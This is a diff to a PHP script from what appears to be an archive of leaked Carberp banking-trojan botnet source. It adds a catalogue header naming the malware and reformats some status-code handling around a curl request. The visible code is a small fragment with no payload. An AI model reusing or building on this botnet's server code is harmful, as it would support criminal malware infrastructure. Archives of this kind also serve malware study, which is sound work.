@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('scripts' . DIRECTORY_SEPARATOR . 'get', '', realpath('.'));
@@ -24,9 +35,11 @@ $result = curl_exec($ch);
 $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);
 curl_close($ch);
 
-if($code == '403'){	header("Status: 403 Forbidden");
+if($code == '403'){
+	header("Status: 403 Forbidden");
 	header("HTTP/1.1 403 Forbidden");
-}elseif($code == '404'){	header("HTTP/1.1 404 Not Found");
+}elseif($code == '404'){
+	header("HTTP/1.1 404 Not Found");
 	header("Status: 404 Not Found");
 }
 
